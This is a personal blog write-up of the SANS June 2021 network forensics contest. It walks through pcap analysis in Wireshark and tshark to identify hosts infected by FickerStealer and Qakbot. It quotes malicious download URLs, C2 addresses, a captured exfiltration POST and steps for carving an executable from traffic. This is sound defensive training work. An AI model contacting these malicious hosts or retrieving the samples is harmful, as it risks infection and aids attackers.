---
title: "SANS June 2021 Forensic Contest"
categories: ["IT and Cyber Security"]
tags: ['Digital Forensics']
date: 2021-06-29
---

## Update

The answers have been released and are available here:
[https://isc.sans.edu/forums/diary/June+2021+Forensic+Contest+Answers+and+Analysis/27582/](https://isc.sans.edu/forums/diary/June+2021+Forensic+Contest+Answers+and+Analysis/27582/)

They said it was hard, and it was. I'm proud of what I found! Reflecting back:

- For some reason, I thought they meant not all the machines are infected. It turns out all three were! So I skipped over .93 entirely. Similarly, I was thinking each infected machine only had one piece of malware. Wrong again! Because I was looking for the answers and not thinking as if it was a real investigation, I stopped looking too early. I think I would have figured .93 out if I'd looked, although I would have probably missed Hancitor. Talking of...
- I didn't know Google Feedproxy could be part of a(n) (Hancitor) infection - I thought this traffic was all legit. I'm not upset that I missed it though - this will come with experience. The more I see, the more I learn, and the more I will recognise potentially malicious activity.
- The zip couldn't be unzipped because the pcap was incomplete (packet loss). Glad I didn't waste too much time trying to figure that out! Although I could have used URLhaus to download the .xlsx malware sample separately. Never thought of that before.

## Original Post

[https://isc.sans.edu/forums/diary/June+2021+Forensic+Contest/27532/](https://isc.sans.edu/forums/diary/June+2021+Forensic+Contest/27532/)

<br>

- [Preparation](#preparation)
- [Questions](#questions)
  * [IP addresses of the infected Windows computers.](#ip-addresses-of-the-infected-windows-computers)
  * [Host names of the infected Windows computers.](#host-names-of-the-infected-windows-computers)
  * [User account names from the infected Windows computers.](#user-account-names-from-the-infected-windows-computers)
  * [Date and time the infection activity began in UTC for each infected computer.](#date-and-time-the-infection-activity-began-in-utc-for-each-infected-computer)
  * [The family of malware involved for each infection.](#the-family-of-malware-involved-for-each-infection)

## Preparation

First, download and unzip (pass:infected) the pcap:

`wget https://github.com/brad-duncan/June-2021-forensic-quiz/raw/main/June-2021-forensic-contest.pcap.zip`

The infected Windows host is part of an AD environment.

The user account is formatted as firstname.lastname.

- LAN segment range: 10.6.15.0/24 (10.6.15.0 through 10.6.15.255)
- Domain: saltmobsters.com
- Domain Controller: 10.6.15.5 - Saltmobsters-DC
- LAN segment gateway: 10.6.15.1
- LAN segment broadcast address: 10.6.15.255

Following the suggestion from Brad, I'll start by splitting the pcap into separate pcaps by host. Using Endpoints from the Statistics menu, I can find the IPs of the machines in the 10.6.15.0/24 subnet: **.93, .119, .187**. The Endpoints menu also gives the ethernet (MAC) addresses which, when resolved, gives us one Cisco, one Dell, and three ASUSTekC adapters (.1, .5, then the three other IPs). I'm going to use the IPs, so a filter for `ip.addr==10.6.15.93` then Export Specified Packets from the File menu (and repeat for .119 and .187).

## Questions

### IP addresses of the infected Windows computers.

Let's start with Export Objects → HTTP. This can show if any malware was downloaded.

<br>

**.93**

We have many .cabs and a few .exes from windowsupdate.com from an Akamai IP (which is legit). VirusTotal seems to think these files are safe.

<br>

**.119**

A large number of objects, including some from suspicious domains such as ststephenskisugu.church and hadevatjulps.com, as well as some from raw IPs including octet-streams. This could be something.

<br>

**.187**

This, again, has windowsupdate.com, as well as some from solarwindsonline.com, including documents.zip and Oliver.Williams-84.zip.

<br>

This suggests **.119 and .187** are the infected machines.

<br>

A bit more looking into .93, to confirm nothing bad is happening.

First, try Brad's Basic search:

`(http.request or tls.handshake.type == 1) and !(ssdp)`

Nothing too scary looking. Nearly all the server names (`tls.handshake.extensions_server_name`) are Microsoft-related.

Checking the Endpoints again, the largest number of bytes transferred to a single IP is only 1099k, and this is part of Windows Updates. In fact, all the top IPs relate to Akami (Windows Updates) or Microsoft, so no large malware is downloaded, nor is there a large amount of communication (such as for C2).

<br>

I think we can safely say **.119 and .187** are the infected machines.

### Host names of the infected Windows computers.

DHCP and NBNS are usually useful for giving hostnames.

`ip.addr==10.6.15.0/24 && (nbns || dhcp)`

This only has NBNS. We want the `nbns.name` field.

- 10.6.15.119: DESKTOP-NIEE9LP
- 10.6.15.187: DESKTOP-YS6FZ2G

And the not infected one:

- 10.6.15.93: DEKSTOP-A1CTJVY *Yes, it's dekstop not desktop.*

### User account names from the infected Windows computers.

Kerberos's `CNameString` is good for user account names.

- 10.6.15.119: tommy.vega
- 10.6.15.187: horace.maddox

And the not infected one:

- 10.6.15.93: raquel.anderson

### Date and time the infection activity began in UTC for each infected computer.

**.119**

Let's try Brad's Basic filter again.

After a number of connections to Microsoft and Google (mainly TLSv1.2), we get the first uncommon request: `http://ststephenskisugu.church/ordinate.php?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+omzcfo+(signorecouncelling)`. However, this comes directly after a request to Google feed proxy (`http://feedproxy.google.com/~r/omzcfo/~3/s_JJ7f44kmQ/ordinate.php`), and a bit of research shows St Stephen's Kisugu is a legitimate church/website. The `ordinate.php` from Google gives the link St Stephen's Kisugu link. I think this is okay.

Some more legitimate-looking requests follow, then a few suspicious-looking ones in a row:

```
10185	2021-06-16 14:37:08	10.6.15.119	50711	194.226.60.15	80	HTTP	464		hadevatjulps.com				POST /8/forum.php HTTP/1.1  (application/x-www-form-urlencoded)
10197	2021-06-16 14:37:09	10.6.15.119	50712	8.209.119.208	80	HTTP	223		srand04rf.ru				GET /16.bin HTTP/1.1 
10201	2021-06-16 14:37:09	10.6.15.119	50712	8.209.119.208	80	HTTP	224		srand04rf.ru				GET /16s.bin HTTP/1.1 
10205	2021-06-16 14:37:10	10.6.15.119	50713	162.244.83.95	80	HTTP	230		162.244.83.95				GET /VOoH HTTP/1.1 
10208	2021-06-16 14:37:10	10.6.15.119	50712	8.209.119.208	80	HTTP	231		srand04rf.ru				GET /f7juhkryu4.exe HTTP/1.1 
10215	2021-06-16 14:37:10	10.6.15.119	50714	162.244.83.95	443	HTTP	246		162.244.83.95:443				GET /4Erq HTTP/1.1 
10780	2021-06-16 14:37:11	10.6.15.119	50715	65.60.35.141	80	HTTP	448		65.60.35.141				GET /pixel HTTP/1.1 
10781	2021-06-16 14:37:11	10.6.15.119	50716	65.60.35.141	443	HTTP	444		65.60.35.141:443				GET /g.pixel HTTP/1.1
```

After these there are a large number of HTTP connections to `65[.]60[.]35[.]141` - but over port 443, instead of 80, and nearly all for `/g.pixel`. This could be the C2.

Looking at just these likely-malicious IPs:

`ip.addr==194.226.60.15 || ip.addr==8.209.119.208 || ip.addr==162.244.83.95 || ip.addr==65.60.35.141`

The first connection is:

`10182	2021-06-16 14:37:08	10.6.15.119	50711	194.226.60.15	80	TCP	66	50711 → 80 [SYN] Seq=0 Win=65535 Len=0 MSS=1460 WS=256 SACK_PERM=1`

This connection consists of:

```
POST /8/forum.php HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Host: hadevatjulps.com
Content-Length: 161
Cache-Control: no-cache

GUID=10958113038079894272&BUILD=1605_zdlpg&INFO=DESKTOP-NIEE9LP @ SALTMOBSTERS\tommy.vega&EXT=SALTMOBSTERS;saltmobsters.com;&IP=173.66.46.97&TYPE=1&WIN=10.0(x64)HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Wed, 16 Jun 2021 14:37:07 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.4.45

88
MYBNARZAEg4OCkBVVQkIGxQeSk4IHFQID1VLTFQYExQHARZAEg4OCkBVVQkIGxQeSk4IHFQID1VLTAlUGBMUBwEYQBIODgpAVVUJCBsUHkpOCBxUCA9VHE0QDxIRCAMPTlQfAh8H
0
```

That is not data you'd want to be going to a malicious IP! This also confirms the user and hostname we previously found.

This looks to be when the malicious activity started: **2021-06-16 14:37:08**.

The next two connections are downloading the `.bin` files and `VOoh` from the `.ru` domain. These are just `data` files. Putting the hashes of them into VirusTotal gives something for `VOoh`: BackDoor.Meterpreter.152; Trojan.Win32.COBALT.SMD.hp; ATK/Cobalt-D.

`4Erq` is also just data with no results for the hash. The `pixel` files are also just `data`.

And now the .exe! I couldn't export `f7juhkryu4.exe` with Export Objects → HTTP, but I could save the stream: Right click, Follow → TCP Stream, Show and save data as: Raw (very important!), then Save as. Go into your text editor of choice (VSCode) and delete everything before `MZ` (as an MS-DOS executable always starts with MZ). However, the hash doesn't return any information. Running `strings` on it doesn't help much either, although it does show that it has the libraries for making network connections. I'm not going to attempt to full reverse-analyse it for this challenge.

However, if you put the URL (`hxxp://srand04rf[.]ru/f7juhkryu4.exe`) into VirusTotal, it says it is malicious - likely FickerStealer. URLhaus agreed with the FickerStealer designation.

Checking Endpoints again, there are a lot of packets with `185[.]66[.]15[.]228`. This is a Russian IP relating to `noc[.]su`. This is about 4MB of outbound data; the only inbound is a request containing `.'........%userprofile%\Desktop....*.txt....`. The outbound is all encrypted. I'd say it's data exfiltration. This data does appear in Export Objects → HTTP, but with no Hostname, Content Type, or Filename, and is only `data`.

In the timeline of events, this data exfil comes after the above executables (and data) are downloaded (i.e. after FickerStealer), but before the `pixel` (C2) connections.

<br>

**.187**

Export Objects → HTTP gives a large number of `documents.zip` files from `solarwindsonline[.]com`. However, the `file` of these are just `data` - they're not zips. Interestingly, these all come from a single GET request to `hxxp://solarwindsonline[.]com/miss-alicia-abbott/documents.zip`. So perhaps it is a zip, but chunked/in pieces.

By following the stream we can see this is initiated by a different request:

`5617	2021-06-16 15:30:50	10.6.15.187	54774	192.186.204.161	80	TCP	66	54774 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM=1`

Which was for `hxxp://solarwindsonline[.]com/miss-alicia-abbott/Oliver.Williams-84.zip`

This zip is also not a zip; it is, in fact, a script. The content of the "zip" response is:

`<div id="ll" data-rr="/miss-alicia-abbott/documents.zip"></div><script>location.pathname = document.getElementById('ll').getAttribute('data-rr');</script>Wait...`

Following this stream, we see one potentially interesting string: `plan-1770706984.xlsb`. xlsb are binary-encoded Excel files (compared with xlsx which store them in XML format). There's also a `PK` near the beginning of the stream. PK relates to zip archives.

Similar to how we did for `f7juhkryu4.exe`, we can Follow the TCP Stream, viewing only the received data, and saving it as Raw. First, in VSCode, I removed everything relating to the headers, but `file` gave it only as data. Second, I removed everything before the `PK` (the magic numbers for a zip file). Unfortunately, if it is a zip, it appears to be corrupt:

```bash
$ unzip documents.zip 
Archive:  documents.zip
warning [documents.zip]:  122926 extra bytes at beginning or within zipfile
  (attempting to process anyway)
error [documents.zip]:  start of central directory not found;
  zipfile corrupt.
```

The filesize is 271101, so almost half of the bytes are "extra". Hmm.

I played around a bit more but couldn't figure it one out. I'm looking forward to the answers from Brad to see how I could have extracted the Excel document! But I'm sure it's the source of the nastiness. URLhaus suggests this URL is related to Qakbot.

I would say this is the start of the malicious activity: **2021-06-16 15:30:50**.

Now let's try Brad's Basic filter:

`(http.request or tls.handshake.type == 1) and !(ssdp)`

And check Statistics → Endpoints, applying this filter, and sorting by the highest number of packets.

The first IP, `207[.]246[.]77[.]75`, has a 2% abuse confidence score by AbuseIPDB, and suggests it may be related to Qakbot. The connections are all TLS, connecting to the remote server on port 2222. Qakbot has also been known to use this port. Also, by checking the certificate, using the filter `ip.addr==207.246.77.75 && tls.handshake.type==11`, and hunting through the Packet Details box (it's under TLS → Certificate → several more layers), we get this abnormal-looking cert:

`rdnSequence: 5 items (id-at-commonName=zqyefcetkqg.biz,id-at-organizationName=Acipnee Bku Nibza Zidvi LLC.,id-at-localityName=Izuxtwuf,id-at-stateOrProvinceName=ZG,id-at-countryName=AU)`

ZG is not an Aussie state or territory, and the common and org names do not look particularly legit.

In fact, as we're here, let's find all the certificates, using tshark:

```bash
$ tshark -r June-2021-forensic-contest-187.pcap -T fields -e x509sat.uTF8String | sort | uniq -c
  10347 
      2 *.azureedge.net
      1 *.clo.footprintdns.com
     23 *.events.data.microsoft.com
      2 Greater Manchester,Salford,Comodo CA Limited,AAA Certificate Services
      1 LO,Bzrzm,Aibo Ecd Pqwiluzio Ewiri LLC.,mprscuece.com,Hdheuztaktv Ooiqtkeklt Mpkcioteoh,mprscuece.com
      8 Microsoft_RSA_TLS_Issuing_CA_01_KeyBinding
      6 Microsoft_RSA_TLS_Issuing_CA_02_KeyBinding
      5 *.msedge.net
      2 *.msn.com
      1 *.norsecompassgroup.com
      3 *.notify.windows.com,Microsoft_RSA_TLS_Issuing_CA_01_KeyBinding
      1 *.prod.do.dsp.mp.microsoft.com
      1 *.res.outlook.com
      1 *.wns.windows.com
     24 ZG,Izuxtwuf,Acipnee Bku Nibza Zidvi LLC.,zqyefcetkqg.biz,ZG,Izuxtwuf,Acipnee Bku Nibza Zidvi LLC.,zqyefcetkqg.biz
```

Two stand out as a bit strange, the one above, and `mprscuece.com`. Filtering for those in Wireshark:

`x509sat.uTF8String=="zqyefcetkqg[.]biz" || x509sat.uTF8String=="mprscuece[.]com"`

Gives us the IP `144[.]139[.]166[.]18`. This has an abuse score of 0%, but has also been reported as an IOC of Qakbot. However, there are only a handful of packets relating to this IP, and following the stream provides nothing.

Most of the rest appear to be Microsoft-related. However, there is also `192[.]186[.]204[.]161`, which is the `solarwindsonline[.]com` downloads above. It currently has no abuse score or comments.

Removing the filter and checking for all Endpoints (again, starting with the highest number of packets or bytes), another interesting one appears: `103[.]28[.]39[.]29`. No abuse score, but it's still yellow (meaning suspicious). It relates to `share-linux11u[.]nhanhoa[.]com`. A bit of Googling returns [https://www.malwareurl.com/listing.php?as=AS131353&active=on](https://www.malwareurl.com/listing.php?as=AS131353&active=on), which mentions this might be related to - you guessed it - Qakbot. Looking at the pcap, there are a large number of abnormal packets, including Ignored Unknown Record and Bad TCP (including Out Of Order, Duplicate ACK, and Previous Segment Not Captured).

We now have four suspicious IPs:

`ip.addr==192.186.204.161 || ip.addr==207.246.77.75 || ip.addr==144.139.166.18 || ip.addr==103.28.39.29`

The download(s) over HTTP, then TLS connections to .29 over port 443, then TLS connections to .75 over port 2222. I'm ignoring .18 as it was only a few packets.

In fact, Tshark can also give us some interesting info, such as number of packets:

`$ tshark -r June-2021-forensic-contest-187.pcap ip.addr==207.246.77.75 | uniq | wc -l`

and number of TCP streams:

`$ tshark -r June-2021-forensic-contest-187.pcap -T fields -e tcp.stream ip.addr==207.246.77.75 | uniq | wc -l`

.75 had 26 streams across 691 packets.

.29 had only 1 stream across 346 packets.

.18 had only 1 stream across only 12 packets.

### The family of malware involved for each infection.

**.119**

FickerStealer

<br>

**.187**

Qakbot